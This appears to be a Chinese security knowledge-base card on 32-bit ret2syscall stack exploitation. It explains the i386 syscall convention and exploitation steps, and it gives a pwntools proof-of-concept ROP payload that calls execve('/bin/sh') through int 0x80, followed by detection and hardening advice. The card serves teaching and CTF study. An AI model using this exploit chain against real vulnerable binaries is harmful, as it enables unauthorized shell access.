---
id: binary-pwn-stack-ret2syscall-32bit
title: 32 位 ret2syscall：用 pop 链布置 execve 系统调用
type: scenario
domain: binary
path: binary/pwn/stack
technique: ret2syscall
tags:
- pwn
- stack
- rop
- syscall
- int-0x80
- execve
- i386
- nx
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V98
  verified_at: '2026-11-05T19:44:32+08:00'
  notes: 已对照原文 ret2syscall 段落逐项核对：eax=11、ebx=/bin/sh、ecx=edx=0、int 0x80、offset=112 与示例 gadget 地址 0x08051234/0x08065432/0x08048122/0x08091111 完全一致；i386 系统调用约定与 execve 参数说明正确。未验证点：原文为教学示例，PoC 未在本机复跑，地址需按目标二进制重算；原文无组件版本，affected_versions 留空正确；frontmatter 无 sources/source_url（全库惯例）。
url: /docs/binary/pwn/stack/binary-pwn-stack-ret2syscall-32bit/
draft: false
kb_aliases:
- ret2syscall
- int 0x80 ROP
- 系统调用 ROP
- execve ROP
---

## 一句话结论

在 NX 开启、拿不到 libc 基址的 32 位栈溢出中，若二进制内同时存在 `pop eax; ret`、`pop ebx/ecx/edx; ret` 与 `int 0x80` 三段 gadget，可用 ROP 把 `eax` 置为 11、`ebx/ecx/edx` 置为 `execve` 的三个参数，再执行 `int 0x80` 直接 getshell，完全不需要泄漏 libc。

## 原理

- NX/DEP 只禁止在栈、堆等数据页执行代码，不禁止复用可执行段（.text）中已有的指令片段；ROP 正是把程序自身的 `ret` 结尾片段串起来执行。
- i386 Linux 的系统调用约定与函数调用不同：系统调用号放在 `eax`，参数依次放在 `ebx`、`ecx`、`edx`、`esi`、`edi`、`ebp`，然后执行 `int 0x80` 进入内核。
- `execve` 的系统调用号是 11（0xb），参数为 `execve(const char *path, char *const argv[], char *const envp[])`。把 `ebx` 指向内存中的 `"/bin/sh\x00"`，`ecx=0`、`edx=0`（Linux 允许 argv/envp 为 NULL），即可执行 `/bin/sh`。
- 32 位函数通过栈传参，但系统调用只读寄存器，因此必须借助 `pop reg; ret` 系列 gadget 从栈上逐个把值装入寄存器；`ret` 每弹一次就自动走到链上的下一个 gadget，形成“布置寄存器 → 触发 syscall”的链条。
- 32 位模式下 `int 0x80` 与 64 位的 `syscall` 指令、寄存器/调用号均不同；本卡只适用于 i386 目标。

## 触发条件

- 目标是 i386（32 位）ELF，存在可覆盖返回地址的栈溢出。
- NX 开启，且二进制未导入 `system` 或无法泄漏 libc 基址；常见于静态链接或裁剪过的程序。
- 二进制中存在 `pop eax; ret`、`pop ebx; pop ecx; pop edx; ret`（或等价的逐寄存器 pop 组合）以及 `int 0x80` 指令。
- 未开启 PIE，或已泄漏代码基址，能确定 gadget 与字符串的固定地址。
- 二进制内已有 `"/bin/sh"` 字符串，或用 `read`/`gets` gadget 先把它写进已知可写地址。

## 利用步骤

1. `checksec` 确认 NX、PIE、Canary、RELRO；用 `pattern_create`/`pattern_offset` 求出缓冲区到保存返回地址的偏移。
2. 用 `ROPgadget --binary ./vuln --only "pop|ret|int"` 搜索 `pop eax; ret`、`pop ebx; pop ecx; pop edx; ret`、`int 0x80`；用 `ROPgadget --string "/bin/sh"` 或 `strings -tx` 定位字符串地址。
3. 若没有现成字符串，增加一段 `read(0, bss, 8)` 链，把 `"/bin/sh\x00"` 写入 `.bss`，再把 `ebx` 指向该地址。
4. 按“设置 eax=11 → 设置 ebx/ecx/edx → int 0x80”的顺序拼链，注意每个 gadget 的 ret 后紧跟其需要的栈上数据。
5. 发送 payload，`int 0x80` 触发后进程被替换为 `/bin/sh`；用 `p.interactive()` 交互。

## PoC

```python
from pwn import *

context.arch = 'i386'
elf = ELF('./static_vuln')
p = process('./static_vuln')

# 以下地址为示例，需用 ROPgadget 在目标二进制中实测替换
pop_eax_ret         = 0x08051234   # pop eax; ret
pop_ebx_ecx_edx_ret = 0x08065432   # pop ebx; pop ecx; pop edx; ret
int_0x80            = 0x08048122   # int 0x80
bin_sh_addr         = 0x08091111   # 二进制内 "/bin/sh\x00" 的地址

offset = 112
payload  = b'A' * offset
payload += p32(pop_eax_ret) + p32(11)            # eax = __NR_execve
payload += p32(pop_ebx_ecx_edx_ret)
payload += p32(bin_sh_addr)                      # ebx = "/bin/sh"
payload += p32(0)                                # ecx = argv = NULL
payload += p32(0)                                # edx = envp = NULL
payload += p32(int_0x80)                         # 触发系统调用

p.sendline(payload)
p.interactive()
```

## 变体与关联

- 变体：没有 `int 0x80` 时改用 `sysenter`/`call gs:[0x10]` 等 32 位系统调用入口；有多余寄存器时把 `ecx`/`edx` 指向可控数组，构造完整的 argv/envp。
- 变体：64 位对应 `ret2syscall` 使用 `syscall`，调用号 `rax=59`，参数在 `rdi/rsi/rdx`；没有 `pop rdi` 等 gadget 时可转向 `ret2csu` 或 SROP。
- 变体：若二进制为动态链接且能泄漏 libc，常规 `ret2libc` 更短；静态链接或符号被裁剪时 ret2syscall 更有优势。
- 关联：[[binary-pwn-stack-ret2libc]]（泄漏 libc 后返回 system 的路线）、[[binary-pwn-rop-mov-rsp-rdi-jmp-r13-system]]（无 libc 基址时复用二进制内 thunk 的另一种思路）。

## 检测与防御

- 检测：崩溃转储中出现连续的 gadget 地址、`int 0x80` 所在页与 `"/bin/sh"` 字符串；进程异常派生出 `sh`/`bash`；对静态链接的 setuid/服务程序重点审计栈溢出。
- 修复：启用 PIE、Canary、Full RELRO，使用 `-fstack-protector-strong`、`-D_FORTIFY_SOURCE=2`，并对用户输入做严格长度校验。
- 加固：以 seccomp 禁用 `execve`（对不需要起子进程的服务）；开启 CET/Shadow Stack 阻止 ret 劫持；ASLR 提高 gadget 地址不确定性。
